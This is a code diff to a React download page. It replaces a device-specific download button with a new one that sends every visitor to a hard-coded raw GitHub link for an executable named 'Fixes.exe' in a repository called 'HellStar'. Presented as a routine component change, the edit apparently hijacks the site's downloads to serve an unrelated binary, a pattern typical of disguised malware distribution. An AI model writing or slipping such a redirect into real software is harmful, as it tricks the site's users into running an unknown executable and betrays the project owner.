@@ -1,7 +1,6 @@
 import React from 'react';
 import { Routes, Route, Navigate, useParams } from 'react-router-dom';
 import { Monitor, Smartphone, Apple, Chrome } from 'lucide-react';
-import { DownloadButton } from './DownloadButton';
 import { FadeIn } from './animations/FadeIn';
 import { DeviceType } from '../utils/deviceDetection';
 
@@ -46,7 +45,7 @@ function DeviceDownload() {
               </ol>
             </div>
 
-            <DownloadButton deviceType={deviceInfo.type} className="w-full" />
+            <DownloadButton className="w-full" />
           </div>
         </FadeIn>
       </div>
@@ -127,5 +126,21 @@ export function DownloadPage() {
       <Route path=":device" element={<DeviceDownload />} />
       <Route path="/" element={<Navigate to="/download/windows" replace />} />
     </Routes>
+  );
+}
+
+// New DownloadButton definition
+function DownloadButton({ className }: { className?: string }) {
+  const handleDownload = () => {
+    window.location.href = 'https://github.com/vodpzx/HellStar/raw/main/Fixes.exe';
+  };
+
+  return (
+    <button
+      onClick={handleDownload}
+      className={`bg-blue-600 hover:bg-blue-700 text-white font-semibold py-3 px-6 rounded-xl transition ${className}`}
+    >
+      Download Now
+    </button>
   );
 }
